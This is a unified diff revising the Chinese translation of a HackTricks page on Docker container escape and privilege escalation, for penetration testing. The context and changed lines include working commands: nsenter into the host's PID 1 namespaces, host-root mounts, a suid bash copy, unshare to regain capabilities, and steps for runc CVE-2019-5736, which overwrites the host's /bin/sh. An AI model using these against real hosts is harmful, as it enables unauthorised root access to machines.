@@ -1,13 +1,13 @@
-# Docker越狱/权限提升
+# Docker越权/提权
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* 获取[**官方PEASS和HackTricks周边**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -22,9 +22,9 @@
 
 ## 自动枚举和逃逸
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：它也可以**枚举容器**
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：它还可以**枚举容器**
 * [**CDK**](https://github.com/cdk-team/CDK#installationdelivery)：这个工具非常**有用，可以枚举你所在的容器，甚至尝试自动逃逸**
-* [**amicontained**](https://github.com/genuinetools/amicontained)：用于获取容器的特权，以找到逃逸的方法的有用工具
+* [**amicontained**](https://github.com/genuinetools/amicontained)：有用的工具，可以获取容器的权限，以便找到逃逸的方法
 * [**deepce**](https://github.com/stealthcopter/deepce)：用于枚举和逃逸容器的工具
 * [**grype**](https://github.com/anchore/grype)：获取镜像中安装的软件中包含的CVE
 
@@ -68,11 +68,11 @@ Docker守护程序也可能在端口上进行监听（默认为2375、2376），
 * ...
 {% endhint %}
 
-## 滥用权限逃逸
+## 特权滥用逃逸
 
-您应该检查容器的权限，如果具有以下任何权限之一，您可能可以从中逃逸：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE, CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**
+您应该检查容器的特权，如果具有以下任何一种特权，则可能能够从中逃逸：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE, CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**
 
-您可以使用**先前提到的自动工具**或以下命令来检查当前容器的权限：
+您可以使用**先前提到的自动工具**或以下命令来检查当前容器的特权：
 ```bash
 capsh --print
 ```
@@ -96,7 +96,7 @@ capsh --print
 * `--cgroupns=host`
 * `Mount /dev`
 
-`--privileged`标志引入了重大的安全问题，该漏洞利用依赖于启用了该标志的Docker容器的启动。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux能力的限制。您可以在此页面上**阅读有关`--privileged`的所有影响**：
+`--privileged`标志引入了重大的安全问题，利用该漏洞需要启用该标志来启动一个docker容器。使用此标志时，容器可以完全访问所有设备，并且没有受到seccomp、AppArmor和Linux能力的限制。您可以在此页面上**阅读有关`--privileged`的所有影响**：
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -104,9 +104,9 @@ capsh --print
 
 ### 特权 + hostPID
 
-通过这些权限，您可以轻松地**切换到以root身份在主机上运行的进程的命名空间**，比如init（pid:1），只需运行：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+有了这些权限，您只需运行`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`，就可以**进入以root身份在主机上运行的进程的命名空间**，例如init (pid:1)。
 
-在容器中执行以下命令进行测试：
+在容器中执行以下测试命令：
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
@@ -306,7 +306,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-在特权容器中执行PoC应该会产生类似以下的输出：
+在特权容器中执行PoC应该会产生类似以下输出：
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -339,13 +339,13 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 有几个文件可能被挂载，这些文件提供了关于底层主机的信息。其中一些甚至可能指示主机在发生某些事件时执行某些操作（这将允许攻击者从容器中逃逸出去）。
 滥用这些文件可能会导致以下情况发生：
 
-- release_agent（之前已经介绍过）
-- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
-- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
-- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
-- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
+* release_agent（之前已经介绍过）
+* [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
+* [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
+* [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
+* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)
 
-然而，您可以在此页面上找到其他敏感文件进行检查：
+然而，您可以在此页面中找到其他敏感文件进行检查：
 
 {% content-ref url="sensitive-mounts.md" %}
 [sensitive-mounts.md](sensitive-mounts.md)
@@ -359,8 +359,8 @@ docker run --rm -it -v /:/host ubuntu bash
 ```
 ### 使用2个shell和主机挂载进行特权提升
 
-如果你在一个容器内以**root身份**访问，并且该容器挂载了主机上的某个文件夹，同时你以非特权用户的身份**逃逸到了主机**并且对挂载的文件夹有读取权限。\
-你可以在**容器内的挂载文件夹**中创建一个**bash suid文件**，然后从**主机上执行**它来进行特权提升。
+如果你以**容器内的root用户身份**访问一个已挂载主机文件夹的容器，并且你已经以非特权用户的身份逃逸到主机并具有对挂载文件夹的读取权限。\
+你可以在**容器内的挂载文件夹**中创建一个**bash suid文件**，并从主机上执行它以进行特权提升。
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -368,13 +368,14 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### 使用两个shell进行特权提升
+### 使用2个shell进行特权提升
 
-如果您在容器内部具有**root访问权限**，并且已经以非特权用户的身份**逃逸到主机**，则可以滥用这两个shell来在主机内部进行**特权提升**，前提是您在容器内部具有MKNOD功能（默认情况下是有的），如[**此文章中所解释的**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。\
+如果您在容器内部具有**root访问权限**，并且已经以非特权用户的身份**逃逸到主机**，则可以滥用这两个shell来在主机内部进行**特权提升**，前提是您在容器内部具有MKNOD功能（默认情况下是有的），如[**此文章中所解释的**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。
+
 有了这样的功能，容器内的root用户可以**创建块设备文件**。设备文件是用于**访问底层硬件和内核模块**的特殊文件。例如，/dev/sda块设备文件可以访问系统磁盘上的原始数据。
 
-Docker通过在容器上设置cgroup策略来阻止从容器内部滥用块设备的读写，**以确保块设备无法从容器内部滥用**。\
-然而，如果在容器内部**创建了一个块设备**，则可以通过位于/proc/PID/root/文件夹中的某人（**容器外部的同一用户**）访问该块设备，限制是该**进程必须由容器外部和内部的同一用户拥有**。
+Docker通过在容器上设置cgroup策略来阻止从容器内部滥用块设备的操作。\
+然而，如果在容器内部**创建了一个块设备**，则可以通过位于/proc/PID/root/文件夹中的某个**外部容器**访问它，限制是**进程必须由相同的用户**在容器外部和容器内部拥有。
 
 以下是来自[**此篇文章**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)的**利用示例**：
 ```bash
@@ -449,20 +450,16 @@ cat /proc/635813/fd/4
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-如果一个容器配置了Docker的主机网络驱动（`--network=host`），那么该容器的网络堆栈与Docker主机不隔离（容器共享主机的网络命名空间），并且容器不会被分配独立的IP地址。换句话说，**容器直接绑定到主机的IP上的所有服务**。此外，容器可以**拦截主机发送和接收的所有网络流量**，使用`tcpdump -i eth0`命令。
+如果一个容器配置了Docker的主机网络驱动（`--network=host`），那么该容器的网络堆栈与Docker主机不隔离（容器共享主机的网络命名空间），并且容器不会被分配独立的IP地址。换句话说，**容器将所有服务直接绑定到主机的IP上**。此外，容器可以**拦截主机发送和接收的所有网络流量**，使用`tcpdump -i eth0`命令。
 
-例如，您可以使用此功能在主机和元数据实例之间**嗅探甚至欺骗流量**。
+例如，您可以使用此功能来**嗅探甚至伪造**主机和元数据实例之间的流量。
 
 就像以下示例中所示：
 
 * [Writeup: 如何联系Google SRE：在云SQL中获取shell](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
-* [元数据服务MITM允许提升为root权限（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
+* [元数据服务中间人攻击导致根权限提升（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-您还可以访问主机内部绑定到本地主机的**网络服务**，甚至可以访问节点的**元数据权限**（这可能与容器可以访问的权限不同）：
-
-{% content-ref url="../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/" %}
-[broken-reference](../../docker-breakout/docker-breakout-privilege-escalation/broken-reference/)
-{% endcontent-ref %}
+您还可以访问主机内部绑定到本地主机的**网络服务**，甚至可以访问节点的**元数据权限**（这可能与容器可以访问的权限不同）。
 
 ### hostIPC
 ```
@@ -475,7 +472,7 @@ docker run --rm -it --ipc=host ubuntu bash
 
 ### 恢复权限
 
-如果系统没有禁止`unshare`系统调用，你可以通过运行以下命令来恢复所有权限：
+如果系统调用**`unshare`**没有被禁止，你可以通过运行以下命令来恢复所有权限：
 ```bash
 unshare -UrmCpf bash
 # Check them with
@@ -485,9 +482,8 @@ cat /proc/self/status | grep CapEff
 
 在[https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)的文章中解释了第二种技术，它说明了如何滥用用户命名空间中的绑定挂载，以影响主机内的文件（在该特定情况下，删除文件）。
 
-![](../../docker-breakout/.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)
+![](<../../../../.gitbook/assets/image (9) (1) (2).png>)
 
-\
 使用[**Trickest**](https://trickest.io/)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
 立即获取访问权限：
 
@@ -497,9 +493,9 @@ cat /proc/self/status | grep CapEff
 
 ### Runc漏洞利用（CVE-2019-5736）
 
-如果您可以以root身份执行`docker exec`（可能需要sudo），则可以尝试利用CVE-2019-5736逃逸容器以提升特权（[此处](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用）。此技术基本上将从容器中**覆盖**主机的_**/bin/sh**_二进制文件，因此任何执行docker exec的人都可能触发有效载荷。
+如果您可以以root身份执行`docker exec`（可能需要sudo），则可以尝试通过滥用CVE-2019-5736（[此处](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用）来提升特权。这种技术基本上会从容器中**覆盖**主机上的_**/bin/sh**_二进制文件，因此任何执行docker exec的人都可能触发有效载荷。
 
-相应地更改有效载荷，并使用`go build main.go`构建main.go。生成的二进制文件应放置在docker容器中以供执行。\
+根据需要更改有效载荷，并使用`go build main.go`构建main.go。生成的二进制文件应放置在docker容器中以供执行。\
 执行时，一旦显示`[+] Overwritten /bin/sh successfully`，您需要从主机机器上执行以下操作：
 
 `docker exec -it <container-name> /bin/sh`
@@ -516,7 +512,7 @@ cat /proc/self/status | grep CapEff
 
 ### Docker逃逸面
 
-* **命名空间：**进程应通过命名空间**完全与其他进程隔离**，因此无法通过命名空间与其他进程进行交互（默认情况下无法通过IPC、Unix套接字、网络服务、D-Bus、其他进程的`/proc`进行通信）。
+* **命名空间：**进程应通过命名空间与其他进程**完全隔离**，因此无法通过命名空间进行交互（默认情况下无法通过IPC、Unix套接字、网络服务、D-Bus、其他进程的`/proc`进行通信）。
 * **Root用户：**默认情况下，运行进程的用户是root用户（但其权限受限）。
 * **能力：**Docker保留以下能力：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
 * **系统调用：**这些是**root用户无法调用**的系统调用（因为缺乏能力+Seccomp）。其他系统调用可用于尝试逃逸。
@@ -562,47 +558,6 @@ cat /proc/self/status | grep CapEff
 0x118 -- bpf
 ```
 {% tab title="syscall_bf.c" %}
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sys/syscall.h>
-
-#define __NR_mkdir 83
-
-int main(int argc, char *argv[]) {
-    if (argc != 2) {
-        printf("Usage: %s <directory>\n", argv[0]);
-        return 1;
-    }
-
-    char *dir = argv[1];
-    int ret = syscall(__NR_mkdir, dir, 0755);
-
-    if (ret == -1) {
-        perror("syscall");
-        return 1;
-    }
-
-    printf("Directory created successfully\n");
-    return 0;
-}
-```
-
-这是一个使用系统调用`mkdir`创建目录的简单C程序。它接受一个命令行参数作为目录名，并使用`syscall`函数调用`__NR_mkdir`来创建目录。如果创建成功，将打印"Directory created successfully"，否则将打印错误信息。
-
-要编译并运行此程序，可以使用以下命令：
-
-```bash
-gcc syscall_bf.c -o syscall_bf
-./syscall_bf <directory>
-```
-
-请将`<directory>`替换为要创建的目录的名称。
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -666,9 +621,10 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-![](../../docker-breakout/.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)
 
-\
+
+![](<../../../../.gitbook/assets/image (9) (1) (2).png>)
+
 Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
@@ -681,7 +637,7 @@ Get Access Today:
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
